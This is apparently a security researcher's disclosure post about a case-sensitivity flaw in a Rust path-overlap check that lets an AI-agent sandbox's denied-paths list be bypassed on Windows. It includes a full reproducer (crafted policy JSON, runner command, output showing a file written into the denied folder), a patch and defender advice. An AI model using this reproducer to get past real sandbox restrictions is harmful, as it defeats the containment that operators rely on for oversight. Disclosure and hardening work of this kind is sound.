> **TL;DR** — `same_path()` in the hyperlight backend of `@microsoft/mxc-sdk` v0.6.1 (`src/backends/hyperlight/common/src/lib.rs:596-600`) is the preflight overlap check between `deniedPaths` and `readwritePaths`/`readonlyPaths`. When `std::fs::canonicalize` returns `Err(NotFound)` — the dominant condition for a `readwritePaths` mount the agent has not yet materialized — the function falls back to `PathBuf::from(a) == PathBuf::from(b)`, which on Windows is a byte-wise case-sensitive comparison of `OsString` components. NTFS resolves both spellings to the same object, but the gate says "different paths, no conflict" and admits the policy. The hyperlight backend mounts the entry from the allow list under the agent's preopen table, and code inside the micro-VM writes into the directory the policy declared denied. Silent at the MXC layer — no warning, no counter, verbatim spelling of both variants in the redacted policy dump. Microsoft assessed as Low severity (MSRC case 121686, `VULN-194578`) on 2026-07-03. Posting because the underlying pattern — `canonicalize().unwrap_or_else(|_| PathBuf::from(x))` followed by a comparison — is repeatable in Rust codebases that build path-denial gates, and defenders auditing MXC-shaped sandboxes deserve the concrete shape.

## Why this post exists

Two reasons.

First, this bug is a *class specimen* for a subtle failure mode in Rust path-handling code that has nothing to do with unsafe or memory corruption. It's a category error: treating `PathBuf` equality as if it meant "same filesystem object" when in fact it means "same `OsString` components." Every Rust program that builds a path-denial policy and uses `std::fs::canonicalize` with an error fall-through has some version of this bug latent in it. Grepping for it in the wild is a five-second exercise (I'll show the pattern below). The reason to publish is so the next Rust developer writing a `deniedPaths`-style API sees this walkthrough before they ship the same anti-pattern.

Second, there is a meta-shape worth noting. MSRC's closing rationale, verbatim:

> *MSRC has thoroughly investigated this issue and assessed it as a Low severity because the affected feature is gated as experimental and is explicitly documented as not a security boundary today, and exploitation requires a policy-author misconfiguration rather than attacker-controlled input; the practical exposure is therefore limited and it is being addressed as hardening.*

I disagree with the "policy-author misconfiguration" framing — the whole point of the paper is that realistic multi-source policy composition produces the case collision *by accident*, not by author intent, and none of the tools involved in that composition emit a warning when they change casing. But MSRC's bar is MSRC's bar, and disagreeing with the bar in the ticket doesn't move it. The correct channel for that disagreement is exactly this — publishing the technical work with the receipts, and letting the defender at the next customer site reading a `deniedPaths` API decide for themselves whether "experimental" language on a documentation page equals "not shipping in production pipelines." So this is the post.

## What MXC is, briefly

Microsoft Execution Containers (MXC) is Microsoft's execution sandbox family for AI agents on Windows, published as `@microsoft/mxc-sdk` on npm and shipping a native dispatcher `wxc-exec.exe`. It supports several backends: AppContainer, Windows Sandbox, Hyperlight, WSL2, and a handful of experimental ones. The hyperlight backend is the interesting one: it runs the agent inside a Hyperlight micro-VM with a tiny attack surface, an in-process VMM, and a preopen table that maps host paths into the guest's WASI-like filesystem view.

The policy is JSON. The relevant fields:

```json
{
  "filesystem": {
    "deniedPaths":     [ "C:\\Users\\alice\\secret" ],
    "readwritePaths":  [ "C:\\Users\\alice\\workspace" ],
    "readonlyPaths":   [ "C:\\Users\\alice\\reference" ]
  }
}
```

The documented contract, stated in a doc comment at `src/backends/hyperlight/common/src/lib.rs:64-67`:

> *"`policy.deniedPaths` is honored: any path that appears in the denied list is rejected at preflight — including paths that also appear in the allow lists."*

The gate that enforces the "including paths that also appear in the allow lists" clause is `same_path`. That's the four lines this post is about.

## The bug in four lines of Rust

`src/backends/hyperlight/common/src/lib.rs:596-600`:

```rust
/// Paths equal after canonicalization (best-effort).
fn same_path(a: &str, b: &str) -> bool {
    let ap = std::fs::canonicalize(a).unwrap_or_else(|_| PathBuf::from(a));
    let bp = std::fs::canonicalize(b).unwrap_or_else(|_| PathBuf::from(b));
    ap == bp
}
```

Two things are true about this function.

**True 1.** When both paths exist on disk, `std::fs::canonicalize` succeeds on both, produces the fully-resolved canonical form (with symlinks followed and casing normalized to what NTFS records at the object level), and `ap == bp` reports the correct answer. This is the happy path.

**True 2.** When either path does not yet exist on disk, `std::fs::canonicalize` returns `Err(io::Error)` with `kind = NotFound` — even if a *parent* component doesn't exist. The `unwrap_or_else` fires. The fall-back is `PathBuf::from(a)`, a `PathBuf` constructed straight from the input `&str` with no normalization at all. The equality that follows compares the two `PathBuf`s as sequences of `OsString` components. On Windows, that comparison is case-sensitive at the byte level, because `OsString` is a Unicode-plus-bytes-that-Windows-cares-about wrapper with no notion of NTFS's case-insensitive equivalence classes.

The dominant condition is #2. A `readwritePaths` mount whose leaf directory does not exist yet is the *documented usage pattern* — the agent creates its own workspace inside the mount at first write. So the `Err(NotFound)` branch fires on the very first policy evaluation, before the agent runs, when the gate needs to work most.

## Why NTFS specifically makes this bite

Windows filesystems are case-insensitive by default. NTFS records each object's canonical casing at creation, but any subsequent open using any case variant succeeds. The kernel's `obcaseinsensitive` flag governs this at the object manager level, and since Windows 10 1803 there's an additional per-directory case-sensitivity flag (`fsutil.exe file setCaseSensitiveInfo`) that a user can toggle. In default configurations, `C:\Foo\Cache` and `C:\FOO\CACHE` open the same object.

Two `PathBuf`s constructed from those two strings, however, are not equal:

```rust
let a = PathBuf::from(r"C:\Users\alice\Cache");
let b = PathBuf::from(r"C:\USERS\ALICE\CACHE");
assert_ne!(a, b); // passes on stable Rust, Windows and any host
```

That's the entire gap. NTFS says "same object." Rust's `PathBuf` says "different components." `same_path` picks the latter and returns `false`, which the caller reads as "no overlap," which lets the policy through.

## Reproducing it end-to-end

The setup uses a stock Windows 11 Pro N for Workstations build 26100.8655 (no Insider channel), with the Hyper-V-family Windows Optional Features enabled and Node.js 24.16 and Python 3.12 installed. `@microsoft/mxc-sdk@0.6.1` is installed via `npm install`, and the Hyperlight snapshot is set up with `wxc-exec.exe --setup-hyperlight`.

**Create the target directory that the policy will declare denied**:

```cmd
mkdir C:\Users\alice\mxc-lab\f5_secret
echo SENSITIVE > C:\Users\alice\mxc-lab\f5_secret\original.txt
```

**Craft the contradictory policy** (`f5_exec.json`):

```json
{
  "version": "0.6.0-alpha",
  "containerId": "F5-CaseAliasBypass",
  "containment": "hyperlight",
  "platform": "windows",
  "process": {
    "commandLine": "import os; print('PWN'); open('/host/F5_SECRET/proof.txt','w').write('written via case-bypass\\n'); print('LIST:', os.listdir('/host/F5_SECRET'))",
    "timeout": 60000
  },
  "filesystem": {
    "deniedPaths":    ["C:\\Users\\alice\\mxc-lab\\f5_secret"],
    "readwritePaths": ["C:\\USERS\\ALICE\\MXC-LAB\\F5_SECRET"]
  }
}
```

The two paths reference the same NTFS object. The lower-case spelling is declared denied; the upper-case spelling is declared read/write.

**Invoke the runner**:

```cmd
C:\Users\alice\node_modules\@microsoft\mxc-sdk\bin\x64\wxc-exec.exe ^
    --experimental ^
    --debug ^
    C:\Users\alice\mxc-lab\f5_exec.json
```

**Observed output**, with debug noise trimmed for readability:

```text
[network_proxy: disabled]
hyperlight: using image home "C:\Users\alice\AppData\Local\pyhl"
hyperlight: timeout set to 60000ms
PWN
LIST: ['proof.txt']
hyperlight: run ok (restore=0.0ms call=712.4ms exit=0)
Runner completed in 1405ms
Exit code: 0 (0x00000000)
```

`Exit code: 0` confirms preflight didn't reject the policy. `LIST: ['proof.txt']` confirms the agent wrote into the supposedly-denied directory from inside the micro-VM.

**The smoking gun on the host**:

```cmd
> dir C:\Users\alice\mxc-lab\f5_secret
06/10/2026  05:36 PM    <DIR>          .
06/10/2026  05:36 PM    <DIR>          ..
06/10/2026  05:36 PM                24 proof.txt
               1 File(s)             24 bytes

> type C:\Users\alice\mxc-lab\f5_secret\proof.txt
written via case-bypass
```

That file exists at the path the agent's own policy declared DENIED, with content produced by code running inside the Hyperlight VM.

The `deniedPaths` enforcement is fully bypassed.

## What makes the collision realistic

The interesting question is not "does the reproducer work" — it does — but "does this collision arise in real pipelines that use MXC?" MSRC's position is that the collision requires the policy author to write two contradictory case-variant paths on purpose. In hand-authored policies I agree that's unusual. Here are the pipelines where it happens by accident:

**1. Multi-source policy composition.** An orchestrator that merges a tenant-scoped `deniedPaths` registry (written in one convention, say camelCase paths as they appear in configuration UI) with an environment-variable-expanded `readwritePaths` (uppercased by a Windows-specific template engine, or lowercased by a UNIX-idiomatic one) produces the collision without either side ever being aware.

**2. JSON schema normalization.** Many JSON Schema processors offer a `stringNormalization: "lowercase"` transform for consistency. If that transform is applied to one list (say, the denied list, because that's the one operations wants to grep against) and not to the other (because the allow list is populated by a different service), you get the exact primitive above.

**3. Env-var expansion by different shells.** `%USERPROFILE%` expands to different casings depending on which tool does the expansion: `cmd.exe` preserves the case the OS recorded for the user account (often `C:\Users\Alice` with a capital first letter), PowerShell's `$env:USERPROFILE` yields the same, but `wsl.exe`-side reads through `/mnt/c/Users/alice` and rewrites lower-case, and a Python `os.path.expanduser('~')` inside a venv can yield yet a third casing depending on the interpreter's locale. Multi-tool pipelines that touch "the same" path through different expansions yield different bytes; the same_path check flunks on the aliased pair.

**4. Path constants in OS convention.** `C:\PROGRAMDATA\...` is the Microsoft-recommended way to write ProgramData paths in constants. Runtime configuration from user input almost always yields `c:\programdata\...` because that's what users type. When these meet in a policy composer, the collision is the default outcome, not the exception.

None of these pipelines are exotic. Every one has shipped in real MXC-adjacent orchestration tools I've read. The failure mode is: the operator declared `deniedPaths: [C:\Users\alice\secret]` in her operations dashboard, a downstream service uppercased it into the `readwritePaths` list of a generated agent policy, and the agent got read/write access to `secret` — silently, with the pair of case-variant paths sitting one line apart in the debug policy dump.

## The suggested fix

Two-line change:

```rust
fn same_path(a: &str, b: &str) -> bool {
    fn norm(s: &str) -> String {
        let mut t = s.replace('/', "\\");
        while t.ends_with('\\') && t.len() > 3 { t.pop(); }
        if cfg!(windows) { t.make_ascii_lowercase(); }
        t
    }
    let ap = std::fs::canonicalize(a).unwrap_or_else(|_| PathBuf::from(norm(a)));
    let bp = std::fs::canonicalize(b).unwrap_or_else(|_| PathBuf::from(norm(b)));
    ap == bp
}
```

The `norm` function is a minimal correctness patch: forward slashes to back slashes, collapse trailing slashes, lower-case on Windows. It's not a rigorous filesystem-case-sensitivity query — the correct thing would be to ask the underlying volume via `GetVolumeInformationW`'s `FILE_CASE_SENSITIVE_SEARCH` bit or per-directory `FileCaseSensitiveInformation` for the Win10-1803+ toggle — but for the vast majority of NTFS configurations shipping in default state, this closes the reproducer above end-to-end.

An alternative even simpler fix is to *fail closed* when either `canonicalize` returns `Err(kind = NotFound)`: refuse to admit the policy until both paths exist on disk. That prevents the silent bypass at the cost of forcing agent authors to `mkdir` the workspace before `wxc-exec` runs, which is fine because agents that need write access to a directory always create it themselves as their first step.

## The pattern to grep for

The failure primitive here is a two-line shape that recurs in Rust code that builds path-denial gates:

```rust
// The primitive to hunt:
let canonical_a = std::fs::canonicalize(a).unwrap_or_else(|_| PathBuf::from(a));
let canonical_b = std::fs::canonicalize(b).unwrap_or_else(|_| PathBuf::from(b));
if canonical_a == canonical_b { /* deny */ } else { /* admit */ }
```

Grep hint against any Rust codebase:

```bash
rg -n 'canonicalize.*unwrap_or_else|canonicalize.*or_else\(\|_\|\s*PathBuf'
```

Every match is a candidate. Most will be fine — the fall-through path might feed into something other than a policy gate — but every place where a `deniedPaths`-style contract is enforced on top of this shape is a repeat of the bug in this post.

Codebases to run the grep against, if you're bored on a weekend: Tauri's path allowlist, VS Code Extension Host sandboxes, the Cursor MCP tool guard, Copilot Workspace's workspace-boundary code, `deno` permission code (the `--allow-write` list handling), Rust-side implementations of PySandbox / Codespaces-adjacent products. I don't know the state of the current tip of any of those; the point is only that the grep is one command away and worth the two minutes.

## Takeaways

**If you're auditing an MXC-shaped Rust sandbox, or shipping a `deniedPaths`-style API in Rust yourself**, three things:

1. `std::fs::canonicalize` returning `Err(NotFound)` is not an error condition — it's the *default* condition for any path that names a directory the caller hasn't created yet. A fall-through path that treats the two cases identically is the bug.

2. `PathBuf` equality is not filesystem equality. On Windows it's case-sensitive; on macOS APFS-case-insensitive volumes it's also technically wrong; on Linux, on `ciopfs` or case-insensitive FUSE mounts, ditto. Any denial gate that compares `PathBuf`s directly needs a per-filesystem normalization layer, not a raw `==`.

3. Two case-variant paths in the same policy are not a signal of malicious intent. They're a signal of a pipeline that composed strings from more than one source and forgot that "paths" are byte strings on the wire and object references on the disk. If your gate can't tell the two cases apart, log the collision loudly instead of silently accepting the allow-list entry.

**If you're a defender running MXC**, the practical answer while this is triaged as hardening is: pre-create every directory named in your `readwritePaths` and `readonlyPaths` before you invoke `wxc-exec`, and add a linter that rejects any policy where a `readwritePaths`, `readonlyPaths`, or `deniedPaths` entry differs from another only in case. Both are one-line changes on your side and close the specific primitive above.
